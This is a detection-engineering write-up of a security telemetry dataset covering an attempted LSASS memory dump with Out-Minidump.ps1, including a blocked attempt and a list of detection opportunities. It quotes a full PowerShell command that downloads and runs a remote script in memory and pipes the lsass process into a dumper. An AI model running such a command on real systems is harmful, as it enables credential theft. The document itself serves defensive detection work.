# T1003.001-8: LSASS Memory — Dump LSASS.exe Memory using Out-Minidump.ps1

## Technique Context

LSASS memory dumping is one of the most critical credential access techniques in the MITRE ATT&CK framework. Attackers target the Local Security Authority Subsystem Service (LSASS) process because it holds plaintext credentials, NTLM hashes, Kerberos tickets, and other authentication material in memory. The Out-Minidump.ps1 script is a popular PowerShell-based tool that leverages Windows debugging APIs to create memory dumps of target processes, making it a common choice for both red teams and real attackers due to its simplicity and effectiveness.

Detection engineers focus heavily on this technique because successful LSASS dumping often leads to lateral movement and privilege escalation. The community prioritizes detecting process access events targeting LSASS (especially with high privileges like PROCESS_ALL_ACCESS), unusual process creation patterns involving debugging tools, and file creation events for dump files. PowerShell-based dumping tools like Out-Minidump are particularly scrutinized because they leave distinctive traces in PowerShell logging and process access telemetry.

## What This Dataset Contains

This dataset captures a blocked LSASS dumping attempt using the Out-Minidump.ps1 script. The Security log shows the key PowerShell process creation in EID 4688 with the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory \"C:\AtomicRedTeam\atomics\..\ExternalPayloads\\" -ErrorAction Ignore -Force | Out-Null; try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop} catch{ $_; exit $_.Exception.Response.StatusCode.Value__}; get-process lsass | Out-Minidump}`.

The most critical evidence is the PowerShell process exit with status code `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the LSASS access attempt. Sysmon provides complementary telemetry including process creation (EID 1) for whoami.exe reconnaissance, process access events (EID 10) showing PowerShell accessing another process with full rights (0x1FFFFF), and CreateRemoteThread detection (EID 8) capturing thread injection behavior. Multiple PowerShell processes are visible with .NET runtime loading events (EID 7) and named pipe creation (EID 17).

## What This Dataset Does Not Contain

This dataset lacks the successful completion of LSASS dumping due to Windows Defender's real-time protection. There are no file creation events for actual dump files, no direct LSASS process access events (the target process in EID 10 is whoami.exe, not LSASS), and no successful memory reading operations. The PowerShell script block logging contains only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass) rather than the actual Out-Minidump script content, likely because the script was downloaded and executed in-memory before being blocked.

The Sysmon configuration's include-mode filtering means we don't see ProcessCreate events for all child processes that might have been spawned during the attempt. Additionally, since Defender blocked the technique early, we miss the typical post-exploitation artifacts like successful privilege escalation or credential extraction events that would follow a successful LSASS dump.

## Assessment

This dataset provides excellent value for detection engineering focused on blocked LSASS dumping attempts. The combination of detailed command-line logging in Security EID 4688, Sysmon process access events, and the definitive exit code 0xC0000022 creates a clear signature of attempted but prevented credential access. The PowerShell-based approach with remote script download represents a common real-world attack pattern that many organizations face.

However, the dataset's utility is somewhat limited for understanding successful LSASS dumping techniques since the defensive controls prevented completion. Detection engineers working on environments without robust endpoint protection would benefit from additional datasets showing successful dump creation and exfiltration. The lack of actual Out-Minidump script content in PowerShell logging also limits visibility into the specific APIs and methods being used.

## Detection Opportunities Present in This Data

1. **PowerShell LSASS Targeting Command Lines** - Security EID 4688 command lines containing "get-process lsass" combined with memory dumping functions like "Out-Minidump"

2. **Remote PowerShell Script Download** - Command lines using "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1')" pattern for malicious script retrieval

3. **PowerShell Process Exit with Access Denied** - Security EID 4689 showing PowerShell processes terminating with exit status 0xC0000022, indicating blocked sensitive operations

4. **High-Privilege Process Access Attempts** - Sysmon EID 10 showing PowerShell processes accessing other processes with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS)

5. **CreateRemoteThread from PowerShell** - Sysmon EID 8 events where PowerShell is the source process, indicating potential process injection attempts

6. **PowerShell .NET Runtime Loading Patterns** - Sysmon EID 7 events showing rapid loading of .NET runtime DLLs (mscoree.dll, clr.dll) in PowerShell processes, especially when combined with Windows Defender DLL loads

7. **Token Privilege Escalation in PowerShell Context** - Security EID 4703 showing PowerShell processes (PID 0x18dc) enabling debugging and backup privileges that are commonly needed for LSASS access
